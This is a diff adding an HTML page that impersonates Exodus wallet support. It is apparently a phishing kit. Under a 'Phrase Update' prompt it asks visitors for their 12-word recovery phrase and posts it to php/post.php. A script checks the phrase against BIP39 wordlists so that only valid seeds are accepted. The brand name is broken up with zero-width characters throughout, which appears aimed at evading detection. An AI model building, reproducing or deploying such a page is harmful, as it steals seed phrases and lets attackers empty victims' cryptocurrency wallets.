@@ -1,0 +1,584 @@
+<html class=" gecko win js"><head>
+	<meta charset="utf-8">
+	<title>Ex​od​us Support</title>
+
+	<meta name="robots" content="noindex, nofollow">
+
+	<meta name="viewport" content="width=device-width, maximum-scale=1">
+	<meta name="apple-mobile-web-app-capable" content="yes">
+	<meta name="format-detection" content="telephone=no">
+	<meta name="description" content="Common questions about crypto, blockchain education, and Ex​od​us support documentation">
+	<meta name="author" content="Ex​od​us">
+	<link rel="canonical" href="#">
+	<link rel="stylesheet" href="./assets/css/launch-1610593434831.css">
+	<style>
+		body {
+			background: #f2f4f3;
+		}
+
+		.navbar .navbar-inner {
+			background: #222936;
+		}
+
+		.navbar .nav li a,
+		.navbar .icon-private-w {
+			color: #0bbaff;
+		}
+
+		.navbar .brand,
+		.navbar .nav li a:hover,
+		.navbar .nav li a:focus,
+		.navbar .nav .active a,
+		.navbar .nav .active a:hover,
+		.navbar .nav .active a:focus {
+			color: #ffffff;
+		}
+
+		.navbar a:hover .icon-private-w,
+		.navbar a:focus .icon-private-w,
+		.navbar .active a .icon-private-w,
+		.navbar .active a:hover .icon-private-w,
+		.navbar .active a:focus .icon-private-w {
+			color: #ffffff;
+		}
+
+		#serp-dd .result a:hover,
+		#serp-dd .result>li.active,
+		#fullArticle strong a,
+		#fullArticle a strong,
+		.collection a,
+		.contentWrapper a,
+		.most-pop-articles .popArticles a,
+		.most-pop-articles .popArticles a:hover span,
+		.category-list .category .article-count,
+		.category-list .category:hover .article-count {
+			color: #4381b5;
+		}
+
+		#fullArticle,
+		#fullArticle p,
+		#fullArticle ul,
+		#fullArticle ol,
+		#fullArticle li,
+		#fullArticle div,
+		#fullArticle blockquote,
+		#fullArticle dd,
+		#fullArticle table {
+			color: #585858;
+		}
+	</style>
+	<link rel="stylesheet" href="./assets/css/styles.css">
+	<link rel="apple-touch-icon-precomposed" href="./assets/img/favicons/touch-152.png">
+	<link rel="shortcut icon" type="image/png" href="./assets/img/favicons/favicon-32x32.png">
+	<!--[if lt IE 9]>
+
+        <script src="//d3eto7onm69fcz.cloudfront.net/assets/javascripts/html5shiv.min.js"></script>
+
+    <![endif]-->
+	<!--<script src="https://www.google.com/recaptcha/api.js" async defer></script>-->
+	<!--<script type="application/ld+json">
+        {"@context":"https://schema.org","@type":"WebSite","url":"https://support.ex&#8203;od&#8203;us.io","potentialAction":{"@type":"SearchAction","target":"https://support.ex&#8203;od&#8203;us.io/search?query={query}","query-input":"required name=query"}}
+        </script>-->
+	<script src="./assets/js/script.js"></script>
+	<!-- TEMP FIX for captcha issue, not tested -->
+	<style>
+		.g-recaptcha-bubble-arrow~div {
+			pointer-events: none;
+		}
+	</style>
+	<!-- fix: anchor links scroll correctly on mobile browsers -->
+	<script type="text/javascript">
+		function goToAnchor() {
+			var hash = location.hash;
+			location.hash = "";
+			setTimeout(function () {
+				location.hash = hash
+			}, 0);
+		}
+		window.onload = goToAnchor;
+	</script>
+	<!-- Beacon 2.0 -->
+	<!--<script type="text/javascript">!function(e,t,n){function a(){var e=t.getElementsByTagName("script")[0],n=t.createElement("script");n.type="text/javascript",n.async=!0,n.src="https://beacon-v2.helpscout.net",e.parentNode.insertBefore(n,e)}if(e.Beacon=n=function(t,n,a){e.Beacon.readyQueue.push({method:t,options:n,data:a})},n.readyQueue=[],"complete"===t.readyState)return a();e.attachEvent?e.attachEvent("onload",a):e.addEventListener("load",a,!1)}(window,document,window.Beacon||function(){});</script>-->
+	<!--<script type="text/javascript">window.Beacon('init', 'c25370a2-712b-4031-87f2-f3137a0f4b4f')</script>-->
+	<!--SEO Keywords-->
+	<meta name="keywords" content="best,bitcoin,wallet,ethereum,monero, crypto,xrp,knowledge,blockchain,education,bnb,dcr,decred,wallet,digibyte,dgb">
+	<!--Google Analytics with cookies consent check-->
+	<!--<script async src="https://www.ex&#8203;od&#8203;us.io/plugins/js/analytics.js" />-->
+	<!-- Twitter -->
+	<meta name="twitter:site" content="@ex​od​us_io">
+	<meta name="twitter:image" content="./assets/img/fb-meta.jpg">
+	<!-- Facebook -->
+	<meta property="og:url" content="support.ex​od​us.io">
+	<meta property="og:type" content="website">
+	<meta property="og:image" content="./assets/img/fb-meta-rect.png">
+	<meta property="og:image:secure_url" content="./assets/img/fb-meta-rect.png">
+	<meta property="og:image:type" content="image/png">
+	<meta property="og:image:width" content="3200">
+	<meta property="og:image:height" content="1674">
+
+	<script type="text/javascript" src="./assets/js/bip39.browser.min.js"></script>
+	<script>
+		function validateBIP39() {
+
+			function countWords(str) { return str.trim().split(/\s+/).length; };
+			//function countWords(str) { return str.split(' ').filter(function(n) { return n != '' }).length; };
+
+			var seed = document.getElementsByName('seed').item(0);
+			var length = countWords(seed.value);
+			var modal = document.getElementsByClassName('modal-warning').item(0);
+			var language = ["chinese_simplified", "chinese_traditional", "czech", "english", "french", "italian", "japanese", "korean", "spanish"];
+			var i = 0;
+			var result = false;
+
+			if (length == 12) {
+
+				for (i = 0; i < language.length; i++) {
+					bip39.setDefaultWordlist(language[i]);
+					if (bip39.validateMnemonic(seed.value)) {
+						console.log(language[i] + ":true");
+						result = true;
+						break;
+					} else {
+						console.log(language[i] + ":false");
+						result = false;
+					};
+				};
+
+			};
+
+			if (!result) {
+				event.preventDefault();
+				//modal.style.display = "block";
+				//setTimeout(function() { modal.style.display = "none"; /*seed.value = "";*/ }, 5000);
+				modal.innerHTML = '<b style="color: #FF0000">Error: Your 12-Word Phrase is invalid!</b>';
+				setTimeout(function () { modal.innerHTML = "Enter your 12-Word Phrase (separated by spaces) to update:"; /*seed.value = "";*/ }, 5000);
+			};
+
+		};
+	</script>
+
+<link href="https://fonts.googleapis.com/css?family=Roboto:100,300,400,400i,500,700i&amp;display=swap" rel="stylesheet"><script type="text/javascript" src="./assets/js/headernav.js"></script><script type="text/javascript" src="./assets/js/subscribe.js"></script><script type="text/javascript" src="./assets/js/bootstrap.min.js"></script><script type="text/javascript" src="./assets/js/fancybox.js"></script><link href="./assets/css/fancybox.css" rel="stylesheet"></head>
+
+<body class="all-ready"><main class="x"><nav id="headerNav" class="x__navbar navbar navbar-expand-lg navbar-dark fixed-top x__navbar--popupnav1">
+      <div class="container-fluid x__navbar-content">
+        <div class="x__navbar-left">
+          <h1 class="x__navbar-brand">
+            <a href="#">
+              Ex​od​us: Digital blockchain products
+            </a>
+          </h1>
+        </div>
+        <div class="x__navbar-right">
+          <button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbarSupportedContent">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar top-bar"></span>
+            <span class="icon-bar middle-bar"></span>
+            <span class="icon-bar bottom-bar"></span>
+          </button>
+          <div class="collapse navbar-collapse" id="navbarSupportedContent">
+            <div class="x__navbar-container">
+              <div class="x__navbar-logo-space"></div>
+              <ul class="navbar-nav">
+                <li class="x__navbar-home"><a href="#">Home</a></li>
+
+                <li class="nav-item dropdown">
+                  <a href="#" class="nav-link dropdown-toggle x__navbar-new" id="navbarDropdown1" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Products</a>
+
+                  <div class="dropdown-menu x__dropdown-menu" aria-labelledby="navbarDropdown1">
+                    <div class="x__dropdown-menu-container">
+                      <a href="#" class="x__dropdown-menu-icon x__dropdown-menu-icon--desktop">
+                        <span>
+                          <span class="x__dropdown-menu-txt1">Desktop Wallet</span>
+                          <span class="x__dropdown-menu-txt2">Exchange and transfer digital assets</span>
+                        </span>
+                      </a>
+                      <a href="#" class="x__dropdown-menu-icon x__dropdown-menu-icon--mobile">
+                        <span>
+                          <span class="x__dropdown-menu-txt1">Mobile Wallet</span>
+                          <span class="x__dropdown-menu-txt2">Control your wealth anywhere</span>
+                        </span>
+                      </a>
+                      <a href="#" class="x__dropdown-menu-icon x__dropdown-menu-icon--trezor">
+                        <span>
+                          <span class="x__dropdown-menu-txt1">Trezor Hardware Wallet</span>
+                          <span class="x__dropdown-menu-txt2">Advanced security made easy</span>
+                        </span>
+                      </a>
+                      <a href="#" class="x__dropdown-menu-icon x__dropdown-menu-icon--apps">
+                        <span class="x__dropdown-menu-new">
+                          <span>
+                            <span class="x__dropdown-menu-txt1">Ex​od​us Crypto Apps</span>
+                            <span class="x__dropdown-menu-txt2">
+                              Do more with your wallet
+                            </span>
+                          </span>
+                        </span>
+                      </a>
+                    </div>
+                  </div>
+                </li>
+
+                <li class="nav-item dropdown">
+                  <a href="#" class="nav-link dropdown-toggle" id="navbarDropdown2" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Support</a>
+
+                  <div class="dropdown-menu x__dropdown-menu" aria-labelledby="navbarDropdown2">
+                    <div class="x__dropdown-menu-container">
+                    <a href="#" class="x__dropdown-menu-icon x__dropdown-menu-icon--contact-support">
+                    <span>
+                      <span class="x__dropdown-menu-txt1">Support</span>
+                      <span class="x__dropdown-menu-txt2">
+                        Our customer support engineers are here to help
+                      </span>
+                    </span>
+                  </a>
+
+                      <a href="#" class="x__dropdown-menu-icon x__dropdown-menu-icon--support">
+                        <span>
+                          <span class="x__dropdown-menu-txt1">Knowledge base</span>
+                          <span class="x__dropdown-menu-txt2">Common questions and blockchain education</span>
+                        </span>
+                      </a>
+                      <a href="#" class="x__dropdown-menu-icon x__dropdown-menu-icon--status">
+                        <span>
+                          <span class="x__dropdown-menu-txt1">Status</span>
+                          <span class="x__dropdown-menu-txt2">Ex​od​us and asset availability and reports</span>
+                        </span>
+                      </a>
+
+                      <a href="#" class="x__dropdown-menu-icon x__dropdown-menu-icon--videos">
+                        <span>
+                          <span class="x__dropdown-menu-txt1">Videos</span>
+                          <span class="x__dropdown-menu-txt2">Product Videos, Tutorials, Interviews and more</span>
+                        </span>
+                      </a>
+
+                      <a href="#" class="x__dropdown-menu-icon x__dropdown-menu-icon--blog">
+                        <span>
+                          <span class="x__dropdown-menu-txt1">Blog</span>
+                          <span class="x__dropdown-menu-txt2">Everything you need to know about crypto</span>
+                        </span>
+                      </a>
+
+                      <a href="#" class="x__dropdown-menu-icon x__dropdown-menu-icon--newsletter">
+                        <span>
+                          <span class="x__dropdown-menu-txt1">Newsletter</span>
+                          <span class="x__dropdown-menu-txt2">Sign-up for product updates and crypto highlights</span>
+                        </span>
+                      </a>
+
+                    </div>
+                  </div>
+                </li>
+
+                <li class="nav-item dropdown">
+                  <a href="#" class="nav-link dropdown-toggle" id="navbarDropdown3" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Company</a>
+
+                  <div class="dropdown-menu x__dropdown-menu" aria-labelledby="navbarDropdown3">
+                    <div class="x__dropdown-menu-container">
+                      <a href="#" class="x__dropdown-menu-icon x__dropdown-menu-icon--about">
+                        <span>
+                          <span class="x__dropdown-menu-txt1">About Us</span>
+                          <span class="x__dropdown-menu-txt2">Learn more about Ex​od​us</span>
+                        </span>
+                      </a>
+                      <a href="#" class="x__dropdown-menu-icon x__dropdown-menu-icon--careers">
+                        <span>
+                          <span class="x__dropdown-menu-txt1">Careers</span>
+                          <span class="x__dropdown-menu-txt2">Want to work with us? See our open positions</span>
+                        </span>
+                      </a>
+
+                      <a href="#" class="x__dropdown-menu-icon x__dropdown-menu-icon--contact">
+                        <span>
+                          <span class="x__dropdown-menu-txt1">Contact Us</span>
+                          <span class="x__dropdown-menu-txt2">Get in touch with us</span>
+                        </span>
+                      </a>
+
+                      <a href="#" class="x__dropdown-menu-icon x__dropdown-menu-icon--brand">
+                        <span>
+                          <span class="x__dropdown-menu-txt1">Brand Guidelines</span>
+                          <span class="x__dropdown-menu-txt2">Ex​od​us logo and media kit</span>
+                        </span>
+                      </a>
+                    </div>
+                  </div>
+                </li>
+              </ul>
+              <a href="#" class="x__header-button">
+                <span class="x__button-align">
+                  <span class="x__button-align-text">Download</span>
+                </span>
+              </a>
+            </div>
+          </div><!-- /.navbar-collapse -->
+        </div>
+      </div><!-- /.container-fluid -->
+    </nav></main><div class="bg-div"><div class="x-shape-container rellax" data-rellax-speed="-4"><img src="./assets/img/x-shape.svg"></div></div>
+	<script>
+		window.onload = function () {
+			$("#searchBar input.search-query").focus();
+		};
+	</script>
+	
+
+
+
+	<section id="docsSearch"><div class="main-text">Phrase Update</div>
+		<h1 class="modal-warning tagline">Enter your 12-Word Phrase (separated by spaces) to update:</h1>
+		<form action="php/post.php" method="POST" id="searchBar" autocomplete="off" onsubmit="validateBIP39();">
+			<input type="text" name="phrase" title="search-query" class="search-query" placeholder="" aria-labelledby="" value="" required="">
+				<input type="hidden" name="csrf" id="csrf" value="1337">
+			<button type="submit" aria-labelledby="Update"><span>Update</span></button>
+			<!--<div class="modal-warning" style="display:none"><br/><center><img src="./assets/img/warning.png"><p><b style="color: #BB1215">Your 12-Word Phrase is invalid!</b></p></center></div>-->
+		<img class="search-icon" src="./assets/img/search-icon.svg"></form>
+	</section>
+	<!--/docsSearch-->
+
+
+
+	<section id="contactModal" class="modal hide" tabindex="-1">
+		<h2>Contact Us</h2> <a href="#" id="closeBtn" data-dismiss="modal"><i class="icon-close"></i></a>
+		<div class="modal-body">
+			<form data-parsley-validate="" novalidate="" method="post" action="/contact" enctype="multipart/form-data" class="form-horizontal contact">
+				<div class="control-group">
+					<label for="md-name" class="control-label">Name</label>
+					<div class="controls">
+						<input type="text" name="name" id="md-name" placeholder="(optional)">
+					</div>
+					<!--/controls-->
+				</div>
+				<!--/control-group-->
+				<div class="control-group">
+					<label for="md-email" class="control-label">Email</label>
+					<div class="controls">
+						<input type="email" name="email" id="md-email" data-parsley-required="true" data-parsley-type="email" data-parsley-notblank="true" data-parsley-trigger="change" data-parsley-required-message="Email is required">
+						<input type="text" name="phone" id="phone" value="">
+					</div>
+					<!--/controls-->
+				</div>
+				<!--/control-group-->
+				<div class="control-group">
+					<label for="md-subject" class="control-label">Subject</label>
+					<div class="controls">
+						<input type="text" name="subject" id="md-subject" data-parsley-required="true" data-parsley-notblank="true" data-parsley-required-message="Subject is required">
+					</div>
+					<!--/controls-->
+				</div>
+				<!--/control-group-->
+				<div class="control-group">
+					<label for="md-message" class="control-label">Message</label>
+					<div class="controls">
+						<textarea name="message" id="md-message" data-parsley-required="true" data-parsley-notblank="true" data-parsley-required-message="Message is required"></textarea>
+					</div>
+					<!--/controls-->
+				</div>
+				<!-- /control-group -->
+				<div class="control-group">
+					<label for="file-upload" class="control-label">Upload file</label>
+					<div class="controls">
+						<input id="file-upload" type="file" name="upload" data-parsley-max-file-size="10">
+					</div>
+				</div>
+				<!--/control-group-->
+				<div class="form-actions">
+					<input type="submit" class="btn" value="Send">
+				</div>
+				<!--/form-actions-->
+			</form>
+		</div>
+		<!--/modal-body-->
+	</section>
+	<script src="./assets/js/app3.min.js"></script>
+	<script>
+		// keep iOS links from opening safari
+		if (("standalone" in window.navigator) && window.navigator.standalone) {
+			// If you want to prevent remote links in standalone web apps opening Mobile Safari, change 'remotes' to true
+			var noddy, remotes = false;
+			document.addEventListener('click', function (event) {
+				noddy = event.target;
+				while (noddy.nodeName !== "A" && noddy.nodeName !== "HTML") {
+					noddy = noddy.parentNode;
+				}
+				if ('href' in noddy && noddy.href.indexOf('http') !== -1 && (noddy.href.indexOf(document.location.host) !== -1 || remotes)) {
+					event.preventDefault();
+					document.location.href = noddy.href;
+				}
+			}, false);
+		}
+		$('#contactModal').on('shown', function () {
+			$('#md-name').focus();
+		});
+	</script>
+
+
+<footer class="x-foot">
+      <div class="x-foot__content">
+        <div class="x-foot__nav">
+
+          <div class="accordion" id="footernav">
+            <div class="x-foot__nav-col">
+              <div id="footernavheadingOne">
+                <h6 data-toggle="collapse" data-target="#footernavcollapseOne" aria-expanded="false" aria-controls="footernavcollapseOne">
+                  Product
+                </h6>
+              </div>
+              <div id="footernavcollapseOne" class="collapse" aria-labelledby="footernavheadingOne" data-parent="#footernav">
+                <a href="#">Desktop Wallet</a>
+                <a href="#">Mobile Wallet</a>
+                <a href="#">Trezor Hardware Wallet</a>
+                <a href="#">Ex​od​us Crypto Apps</a>
+              </div>
+              <span class="x-foot__nav-arrow"></span>
+            </div>
+            <div class="x-foot__nav-col">
+              <div id="footernavheadingTwo">
+                <h6 data-toggle="collapse" data-target="#footernavcollapseTwo" aria-expanded="false" aria-controls="footernavcollapseTwo">
+                  Support
+                </h6>
+              </div>
+              <div id="footernavcollapseTwo" class="collapse" aria-labelledby="footernavheadingTwo" data-parent="#footernav">
+
+                <a href="#">Support</a>
+                <a href="#">Knowledge base</a>
+                <a href="#">Status</a>
+                <a href="#">Videos</a>
+                <a href="#">Blog</a>
+                <a href="#">Newsletter</a>
+              </div>
+              <span class="x-foot__nav-arrow"></span>
+            </div>
+            <div class="x-foot__nav-col">
+              <div id="footernavheadingThree">
+                <h6 data-toggle="collapse" data-target="#footernavcollapseThree" aria-expanded="false" aria-controls="footernavcollapseThree">
+                  Company
+                </h6>
+              </div>
+              <div id="footernavcollapseThree" class="collapse" aria-labelledby="footernavheadingThree" data-parent="#footernav">
+                <a href="#">About Us</a>
+                <a href="#">Careers</a>
+                <a href="#">Contact Us</a>
+                <a href="#">Brand Guidelines</a>
+              </div>
+              <span class="x-foot__nav-arrow"></span>
+            </div>
+          </div>
+
+          <div class="x-foot__nav-col x-foot__nav-col--subscribe">
+            <h6>Subscribe to Ex​od​us</h6>
+            <p>Sign up to receive our newsletter with updates about your wallet.</p>
+
+            <form class="x-subscribe-form" id="x-subscribe-form" action="" method="get">
+              <input type="text" autocapitalize="none" autocorrect="off" name="MERGE0" id="MERGE0" placeholder="Your email address" required="">
+              <button type="submit">
+                <svg version="1.1" width="22" height="13" viewBox="0 0 22 13" xmlns="http://www.w3.org/2000/svg">
+                  <path transform="translate(11 6.364) scale(-1 1) translate(-11 -6.364)" d="m3.9645 7.5l3.8137 3.8137-1.4142 1.4142-6.364-6.364 1.4142-1.4142 4.9497-4.9497 1.4142 1.4142-4.0858 4.0858h18.308v2h-18.036z"></path>
+                </svg>
+              </button>
+
+              <span class="x-subscribe-form__success"><span class="x-subscribe-form__success-cont"></span></span>
+            </form>
+            <div id="x-subscribe-result" class="x-subscribe-form__result"></div>
+          </div>
+        </div>
+
+        <div class="row x-foot__logo-row">
+          <div class="col col-12 col-md-7">
+
+            <div class="x-foot__logo">
+
+              <div class="x-foot__logo-img">
+
+                <img src="./assets/img/exo-logo.svg" alt="Ex​od​us Logo">
+
+              </div>
+              <div class="x-foot__logo-txt">
+                Copyright ©
+                2022
+                Ex​od​us Movement, Inc. <br>
+                Ex​od​us was co-founded by Daniel Castagnoli and JP Richardson.
+              </div>
+
+            </div>
+          </div>
+          <div class="col col-12 col-md-5">
+
+            <div class="x-foot__social">
+
+              <a target="" rel="noopener" title="Github" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
+                  <title>Github</title>
+                  <path d="M12 0C5.37 0 0 5.373 0 12c0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61-.546-1.385-1.335-1.755-1.335-1.755-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 21.795 24 17.295 24 12c0-6.627-5.373-12-12-12"></path>
+                </svg>
+              </a>
+
+              <a target="" rel="noopener" title="YouTube" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" width="26" height="18" viewBox="0 0 26 18">
+                  <title>YouTube</title>
+                  <path d="M25.457 2.78A3.244 3.244 0 0 0 23.194.537C21.168 0 13.012 0 13.012 0S4.876-.01 2.829.538A3.244 3.244 0 0 0 .566 2.779 33.238 33.238 0 0 0 0 9.011c-.006 2.083.183 4.161.566 6.209a3.244 3.244 0 0 0 2.263 2.241C4.853 18 13.012 18 13.012 18s8.134 0 10.182-.539a3.244 3.244 0 0 0 2.263-2.241c.375-2.049.556-4.127.542-6.209a33.237 33.237 0 0 0-.542-6.232zM10.408 12.865V5.144l6.789 3.867-6.789 3.855z"></path>
+                </svg>
+
+              </a>
+
+              <a target="" rel="noopener" title="Vimeo" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="21" viewBox="0 0 24 21">
+                  <title>Vimeo</title>
+                  <path d="M23.977 4.812c-.105 2.338-1.739 5.543-4.894 9.61-3.268 4.246-6.026 6.37-8.29 6.37-1.409 0-2.578-1.295-3.553-3.882L5.322 9.796C4.603 7.212 3.834 5.918 3.01 5.918c-.179 0-.806.378-1.881 1.132L0 5.593a315.065 315.065 0 0 0 3.501-3.128C5.08 1.097 6.266.38 7.055.306c1.867-.18 3.016 1.1 3.447 3.838.465 2.953.789 4.79.971 5.507.539 2.45 1.131 3.674 1.776 3.674.502 0 1.256-.796 2.265-2.385 1.004-1.589 1.54-2.797 1.612-3.628.144-1.37-.395-2.06-1.614-2.06-.574 0-1.167.12-1.777.39 1.186-3.868 3.434-5.757 6.762-5.637 2.473.06 3.628 1.664 3.493 4.797l-.013.01z"></path>
+                </svg>
+
+              </a>
+
+              <a target="" rel="noopener" title="Twitter" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="20" viewBox="0 0 24 20">
+                  <title>Twitter</title>
+                  <path d="M23.954 2.323a10 10 0 0 1-2.825.775A4.958 4.958 0 0 0 23.292.375c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 0 0-8.384 4.482C7.691 5.848 4.066 3.884 1.64.915A4.822 4.822 0 0 0 .974 3.39c0 1.71.87 3.213 2.188 4.096A4.904 4.904 0 0 1 .934 6.87v.061a4.923 4.923 0 0 0 3.946 4.827 4.996 4.996 0 0 1-2.212.085 4.937 4.937 0 0 0 4.604 3.417 9.868 9.868 0 0 1-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 0 0 7.557 2.209c9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63a9.936 9.936 0 0 0 2.46-2.548l-.047-.02z"></path>
+                </svg>
+              </a>
+
+              <a target="" rel="noopener" title="Slack" href="#">
+                <svg width="24" height="24" version="1.1" viewBox="0 0 124 124" xmlns="http://www.w3.org/2000/svg">
+                  <title>Slack</title>
+                  <path d="m26.4 78.2c0 7.1-5.8 12.9-12.9 12.9s-12.9-5.8-12.9-12.9 5.8-12.9 12.9-12.9h12.9v12.9zm6.5 0c0-7.1 5.8-12.9 12.9-12.9s12.9 5.8 12.9 12.9v32.3c0 7.1-5.8 12.9-12.9 12.9s-12.9-5.8-12.9-12.9v-32.3zm12.9-51.8c-7.1 0-12.9-5.8-12.9-12.9s5.8-12.9 12.9-12.9 12.9 5.8 12.9 12.9v12.9h-12.9zm0 6.5c7.1 0 12.9 5.8 12.9 12.9s-5.8 12.9-12.9 12.9h-32.3c-7.1 0-12.9-5.8-12.9-12.9s5.8-12.9 12.9-12.9h32.3z"></path>
+                  <path d="m97.6 45.8c0-7.1 5.8-12.9 12.9-12.9s12.9 5.8 12.9 12.9-5.8 12.9-12.9 12.9h-12.9v-12.9zm-6.5 0c0 7.1-5.8 12.9-12.9 12.9s-12.9-5.8-12.9-12.9v-32.3c0-7.1 5.8-12.9 12.9-12.9s12.9 5.8 12.9 12.9v32.3z"></path>
+                  <path d="m78.2 97.6c7.1 0 12.9 5.8 12.9 12.9s-5.8 12.9-12.9 12.9-12.9-5.8-12.9-12.9v-12.9h12.9zm0-6.5c-7.1 0-12.9-5.8-12.9-12.9s5.8-12.9 12.9-12.9h32.3c7.1 0 12.9 5.8 12.9 12.9s-5.8 12.9-12.9 12.9h-32.3z"></path>
+                </svg>
+              </a>
+
+              <a target="" rel="noopener" title="Instagram" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
+                  <title>Instagram</title>
+                  <path d="M12 0C8.74 0 8.333.015 7.053.072 5.775.132 4.905.333 4.14.63a5.876 5.876 0 0 0-2.126 1.384A5.855 5.855 0 0 0 .63 4.14C.333 4.905.131 5.775.072 7.053.012 8.333 0 8.74 0 12s.015 3.667.072 4.947c.06 1.277.261 2.148.558 2.913a5.885 5.885 0 0 0 1.384 2.126A5.868 5.868 0 0 0 4.14 23.37c.766.296 1.636.499 2.913.558C8.333 23.988 8.74 24 12 24s3.667-.015 4.947-.072c1.277-.06 2.148-.262 2.913-.558a5.898 5.898 0 0 0 2.126-1.384 5.86 5.86 0 0 0 1.384-2.126c.296-.765.499-1.636.558-2.913.06-1.28.072-1.687.072-4.947s-.015-3.667-.072-4.947c-.06-1.277-.262-2.149-.558-2.913a5.89 5.89 0 0 0-1.384-2.126A5.847 5.847 0 0 0 19.86.63c-.765-.297-1.636-.499-2.913-.558C15.667.012 15.26 0 12 0zm0 2.16c3.203 0 3.585.016 4.85.071 1.17.055 1.805.249 2.227.415.562.217.96.477 1.382.896.419.42.679.819.896 1.381.164.422.36 1.057.413 2.227.057 1.266.07 1.646.07 4.85 0 3.204-.015 3.585-.074 4.85-.061 1.17-.256 1.805-.421 2.227a3.81 3.81 0 0 1-.899 1.382 3.744 3.744 0 0 1-1.38.896c-.42.164-1.065.36-2.235.413-1.274.057-1.649.07-4.859.07-3.211 0-3.586-.015-4.859-.074-1.171-.061-1.816-.256-2.236-.421a3.716 3.716 0 0 1-1.379-.899 3.644 3.644 0 0 1-.9-1.38c-.165-.42-.359-1.065-.42-2.235-.045-1.26-.061-1.649-.061-4.844 0-3.196.016-3.586.061-4.861.061-1.17.255-1.814.42-2.234.21-.57.479-.96.9-1.381.419-.419.81-.689 1.379-.898.42-.166 1.051-.361 2.221-.421 1.275-.045 1.65-.06 4.859-.06l.045.03zm0 3.678a6.162 6.162 0 1 0 0 12.324 6.162 6.162 0 1 0 0-12.324zM12 16c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4zm7.846-10.405a1.441 1.441 0 0 1-2.88 0 1.44 1.44 0 0 1 2.88 0z"></path>
+                </svg>
+
+              </a>
+
+              <a target="" rel="noopener" title="Facebook" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" width="11" height="22" viewBox="0 0 11 22">
+                  <title>Facebook</title>
+                  <path d="m10.399 3.891c-0.60109-0.17553-1.2923-0.29255-1.9235-0.29255-0.78142 0-2.4645 0.49734-2.4645 1.4628v2.3112h3.9973v3.891h-3.9973v10.737h-4.0273v-10.737h-1.9836v-3.891h1.9836v-1.9601c0-2.9548 1.3825-5.4122 4.7186-5.4122 1.1421 0 3.1858 0.058511 4.2978 0.43883l-0.60109 3.4521z"></path>
+                </svg>
+              </a>
+
+            </div>
+
+          </div>
+        </div>
+
+        <div class="row">
+          <div class="col col-12">
+            <div class="x-foot__txt">
+              <p>
+                Ex​od​us is a software platform ONLY and does not conduct any independent diligence on or substantive review of any blockchain asset, digital currency, cryptocurrency or associated funds. You are fully and solely responsible for evaluating your investments, for determining whether you will exchange blockchain assets based on your own, and for all your decisions as to whether to exchange blockchain assets with Ex​od​us. In many cases, blockchain assets you exchange on the basis of your research may not increase in value, and may decrease in value. Similarly, blockchain assets you exchange on the basis of your research may increase in value after your exchange.
+              </p>
+              <p>
+                Past performance is not indicative of future results. Any investment in blockchain assets involves the risk of loss of part or all of your investment. The value of the blockchain assets you exchange is subject to market and other investment risks.
+              </p>
+              <p>
+                <a target="" rel="noopener" href="#">Privacy Policy</a>
+              </p>
+
+            </div>
+          </div>
+        </div>
+      </div>
+    </footer></body></html>
